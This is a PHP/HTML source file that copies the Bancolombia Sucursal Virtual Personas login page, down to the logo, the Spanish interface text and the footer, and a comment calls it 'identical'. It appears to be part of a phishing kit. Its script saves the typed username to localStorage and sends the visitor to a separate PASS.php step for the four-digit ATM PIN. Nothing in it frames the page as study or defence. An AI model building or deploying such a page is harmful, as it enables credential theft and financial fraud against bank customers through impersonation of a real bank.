<?php
// a/login.php - VERSIÓN SUCURSAL VIRTUAL IDENTICA
session_start();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Bancolombia | Sucursal Virtual Personas</title>
    <link rel="icon" type="image/png" href="../img/logo.png" />
    <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&display=swap');
        
        body { 
            background-color: #F4F4F4; 
            margin: 0; padding: 0; 
            font-family: 'Open Sans', sans-serif; 
            color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .header-top { width: 100%; text-align: center; padding: 40px 0 20px 0; background: #F4F4F4; }
        .logo-bancolombia { width: 160px; }

        .sucursal-title { font-size: 26px; font-weight: 300; color: #555; margin-bottom: 25px; }

        /* Tarjeta Azul de Prográmate */
        .info-card {
            background: #E1F5FE;
            width: 85%;
            max-width: 380px;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            gap: 15px;
            box-sizing: border-box;
        }
        .info-card img { width: 22px; height: 22px; }
        .info-card-text b { font-size: 16px; display: block; margin-bottom: 5px; color: #222; }
        .info-card-text p { font-size: 13px; margin: 0; color: #444; line-height: 1.4; }
        .info-card-text a { color: #222; font-weight: 700; text-decoration: underline; }

        /* Formulario principal */
        .login-container {
            background: #FFFFFF;
            width: 90%;
            max-width: 420px;
            padding: 40px 30px;
            border-radius: 4px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            box-sizing: border-box;
        }

        .hola-title { font-size: 24px; font-weight: 600; margin-bottom: 15px; }
        .sub-title { font-size: 14px; color: #666; margin-bottom: 35px; padding: 0 10px; }

        .input-group { position: relative; margin-bottom: 30px; text-align: left; }
        .input-group label { display: flex; align-items: center; gap: 8px; font-size: 14px; color: #333; margin-bottom: 8px; }
        .input-group input { 
            width: 100%; border: none; border-bottom: 1px solid #999; 
            padding: 8px 0; font-size: 16px; outline: none; background: transparent; 
        }

        .link-text { display: block; text-align: left; font-size: 13px; font-weight: 700; color: #000; text-decoration: underline; margin-bottom: 25px; }

        #btn-login {
            width: 100%; height: 50px; border-radius: 25px; border: none;
            background-color: #E0E0E0; color: #888; font-size: 16px; font-weight: 600;
            margin-bottom: 25px; cursor: not-allowed;
        }
        #btn-login.active { background-color: #FDDA24; color: #000; cursor: pointer; }

        .footer-links { text-align: center; font-size: 13px; color: #555; margin-top: 40px; padding-bottom: 40px; width: 100%; }
        .footer-links p { margin: 15px 0; }
        .footer-logo { width: 140px; margin: 20px 0; }
        .vigilado { width: 150px; opacity: 0.7; }
        .ip-info { font-size: 11px; color: #888; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="header-top">
        <img src="../img/logo.png" class="logo-bancolombia">
    </div>

    <div class="sucursal-title">Sucursal Virtual Personas</div>

    <div class="info-card">
        <img src="../img/bombillo.png"> <div class="info-card-text">
            <b>¡Prográmate!</b>
            <p>Consulta el estado de nuestros canales y los mantenimientos programados. <a href="#">Más info aquí.</a></p>
        </div>
    </div>

    <div class="login-container">
        <div class="hola-title">¡Hola!</div>
        <div class="sub-title">Ingresa los datos para gestionar tus productos y hacer transacciones.</div>

        <div class="input-group">
            <label><img src="../img/user-icon.png" width="16"> Usuario</label>
            <input type="text" id="txt-usuario" autocomplete="off">
        </div>
        <a class="link-text">¿Olvidaste tu usuario?</a>

        <div class="input-group">
            <label><img src="../img/pass-icon.png" width="16"> Clave del cajero</label>
            <input type="password" id="txt-pass-cajero" maxlength="4" readonly>
        </div>
        <a class="link-text">¿Olvidaste o bloqueaste tu clave?</a>

        <button id="btn-login" disabled>Iniciar sesión</button>
        <a class="link-text" style="text-align: center; display: block;">Crear usuario</a>
    </div>

    <div class="footer-links">
        <p>¿Problemas para conectarte?</p>
        <p>Aprende sobre seguridad</p>
        <p>Reglamento Sucursal Virtual</p>
        <p>Política de privacidad</p>
        <hr style="width: 80%; border: 0; border-top: 1px solid #ccc; margin: 20px auto;">
        <img src="../img/logo.png" class="footer-logo">
        <br>
        <img src="../img/vigilado.png" class="vigilado"> <div class="ip-info">
            Dirección IP: <?php echo $_SERVER['REMOTE_ADDR']; ?><br>
            <?php echo date('l, d \d\e F \d\e Y, g:i a'); ?>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            // Activar botón solo si hay datos
            $("#txt-usuario").on("input", function() {
                if ($(this).val().length >= 4) {
                    $("#btn-login").addClass("active").prop("disabled", false);
                } else {
                    $("#btn-login").removeClass("active").prop("disabled", true);
                }
            });

            // Al dar click al input de clave, saltamos a PASS.php
            $("#txt-pass-cajero").click(function() {
                var u = $("#txt-usuario").val();
                if(u !== "") {
                    localStorage.setItem('user_akam', u);
                    window.location.href = "PASS.php";
                }
            });

            $("#btn-login").click(function() {
                var u = $("#txt-usuario").val();
                localStorage.setItem('user_akam', u);
                window.location.href = "PASS.php";
            });
        });
    </script>
</body>
</html>
